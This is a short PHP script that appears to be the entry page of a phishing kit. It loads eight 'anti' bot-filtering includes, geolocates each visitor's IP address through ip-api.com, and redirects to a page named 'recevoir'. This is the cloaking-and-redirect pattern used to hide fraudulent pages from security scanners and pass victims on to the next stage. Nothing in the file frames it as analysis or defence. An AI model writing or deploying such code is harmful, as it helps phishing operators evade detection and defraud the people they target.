<?php
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
session_start();
$ip = getenv("REMOTE_ADDR");
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$countrycode = $IP_LOOKUP->countryCode ;



      header("Location: ./recevoir");
   
  

